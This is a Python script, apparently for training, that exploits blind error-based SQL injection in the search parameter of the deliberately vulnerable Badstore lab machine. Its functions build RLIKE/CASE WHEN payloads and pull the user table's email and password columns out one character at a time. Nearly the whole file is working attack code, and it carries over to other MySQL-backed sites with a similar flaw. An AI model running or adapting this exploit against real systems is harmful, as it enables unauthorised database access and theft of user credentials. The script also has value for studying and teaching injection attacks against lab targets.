#!/usr/bin/python3
# Blind SQLi exploiter
# Dumps the userdb file from the Badstore VM, adopted from Gray Hat C#
# https://www.vulnhub.com/entry/badstore-123,41/

import requests
import argparse

def makeRequest(url, params, payload):
    # split parameters into dictionary
    params = dict(i.split('=') for i in params.split('&'))
    # add payload to the searchquery term
    for key in params.keys():
        if "searchquery" in key:
            params[key] += payload
    # send the request, then returnt he text portion of the response
    r = requests.get(url, params)
    return r.text

def getRows(url, params):
    countLength = 1
    while True:
        # build payload to determined number of cahracters in the number of rows
        payload = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
        payload += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
        payload += " userdb)=" + str(countLength) + ") THEN 0x28 ELSE 0x41 END))"
        payload += " AND 'LeSo'='LeSo"
        
        # send the request
        response = makeRequest(url, params, payload)
        # check for error message, break if the error is present (error = "True")
        if "parentheses not balanced" in response:
            break
        # increment counter (no error = "False")
        countLength += 1
    i = 1
    numRows = []
    while i <= countLength:
        # 48 - 58 = decimal representation of numbers 0-9
        c = 48
        while c <= 58:
            # create payload to test if character = number
            payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
            payload += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),"
            payload += str(i) + ", 1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND '"
            
            # send request
            response = makeRequest(url, params, payload)
            # check for error message, append to numRows
            if "parentheses not balanced" in response:
                numRows.append(chr(c))
                break
            # increment to cycle through numbers 0-9
            c += 1
        # incremented character index
        i += 1
    # Combine list into single number to save the number of rows in numRows
    numRows = int("".join(str(i) for i in numRows))
    print("Rows: " + str(numRows))
    return numRows

def getLength(i, item, url, params):
    countLength = 1
    while True:
        # Create payload to determine the length of the character representation of the length of the value 
        # in a column in a particular row
        payload = "test' RLIKE (SELECT (CASE WHEN ((SELECT"
        payload += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + item + ") AS"
        payload += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT "
        payload += str(i) + ",1)=" + str(countLength) + ") THEN 0x28 ELSE 0x41 END))"
        payload += " AND 'LeSo'='LeSo"
        
        # sends request
        response = makeRequest(url, params, payload)
        # breaks if error hits (error="True")
        if "parentheses not balanced" in response:
            break
        # incremented if no error occurs (no error = "False")
        countLength += 1
    itemLen = []
    j = 1
    while j <= countLength:
        # 48-58 decimal representations of 0-9 numbers
        c = 48
        while c <= 58:
            # create payload to determine if character = number
            payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
            payload += " IFNULL(CAST(CHAR_LENGTH(" + item + ") AS CHAR),0x20) FROM"
            payload += " userdb ORDER BY email LIMIT " + str(i) +",1)," + str(j) 
            payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye"
            
            # send the request
            response = makeRequest(url, params, payload)
            # If error occurs, append the number to itemLen and break (error = "True")
            if "parentheses not balanced" in response:
                itemLen.append(chr(c))
                break
            # if no error occurs, increment the number 0-9 (no error = "False")
            c += 1
        # increment to cycle through the character positions
        j += 1
    # Combine list into number and returned
    itemLen = "".join(str(k) for k in itemLen)
    return itemLen

def getValue(i, item, length, url, params):
    value = []
    j = 1
    if length:
        while j <= int(length):
            # 32-126 are decimal representations of printable characters
            c = 32
            while c<= 126:
                # Create paylod to determine the value at a particular index
                payload = "test' RLIKE(SELECT (CASE WHEN (ORD(MID((SELECT"
                payload += " IFNULL(CAST(" + item+ " AS CHAR),0x20) FROM userdb ORDER BY"
                payload += " email LIMIT " + str(i) + ",1)," + str(j) + ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41"
                payload += " END)) and 'LeSo'='LeSo"
                
                # send request
                response = makeRequest(url, params, payload)
                # if error occurs, appends character to value and breaks (error="True")
                if "parentheses not balanced" in response:
                    value.append(chr(c))
                    break
                # increment through printable characters (no error="False")
                c += 1
            # cycles through characters index
            j += 1
    # combine values in value list to a string and return the string
    value = "".join(str(k) for k in value)
    return value

def printValues(i, item, length, value):
    print("Row " + str(i) + " - " + item + ": " + value + " Length: " + str(length) + " bytes")

def main(args):
    # splits url into url and parameter portions
    url = args.url.split('?')[0]
    params = args.url.split('?')[1]
    # define colomns from userdb to be dumped
    columns = ["email", "passwd"]
    # determine number of rows in userdb, assign to numRows
    numRows = getRows(url, params)
    # For each column in each row, determine the length of the value and assign to length, determine the value of the value 
    # and set to value, then print the value
    for i in range(0, numRows):
        for item in columns:
            length = getLength(i, item, url, params)
            value = getValue(i, item, length, url, params)
            printValues(i, item, length, value)

if __name__ == "__main__":
    # Collects url and passes to main
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="url to attack")
    args = parser.parse_args()
    main(args)
